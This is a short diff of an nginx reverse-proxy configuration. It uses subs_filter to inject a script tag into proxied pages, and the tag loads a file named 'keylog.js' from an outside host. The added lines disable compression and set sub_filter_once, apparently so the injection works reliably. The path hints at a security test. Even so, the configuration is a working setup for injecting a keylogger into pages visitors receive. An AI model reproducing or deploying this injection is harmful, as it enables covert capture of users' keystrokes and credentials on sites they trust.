@@ -51,8 +51,10 @@ add		echo_read_request_body;
 
 add		proxy_pass http://www.microplus.fr/;
 
-add		subs_filter "sting_to_remplace" "sting_to_remplace<script/src='https://www.microplus.fr/secu/images/test/keylog.js'></script>" -o;
+add		subs_filter "sting_to_remplace" "sting_to_remplace<script/src='https://www.microplus.fr/secu/images/test/keylog.js'>
+</script>" -o;
 
-
+add		sub_filter_once on;
+add		proxy_set_header Accept-Encoding "";
 	
 
